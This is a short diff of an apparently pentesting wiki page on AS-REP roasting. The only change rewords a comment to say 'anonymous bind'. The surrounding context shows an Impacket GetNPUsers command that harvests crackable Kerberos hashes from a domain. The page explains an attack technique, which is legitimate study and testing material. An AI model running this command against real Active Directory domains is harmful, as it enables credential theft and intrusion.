@@ -21,7 +21,7 @@ While this attack can be carried out without any prior foothold \(domain user cr
 The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) \(Python\) can get TGTs for the users that have the property `Do not require Kerberos preauthentication` set.
 
 ```bash
-# users list dynamically queried with a LDAP null bind
+# users list dynamically queried with an LDAP anonymous bind
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt 'DOMAIN/'
 
 # with a users file
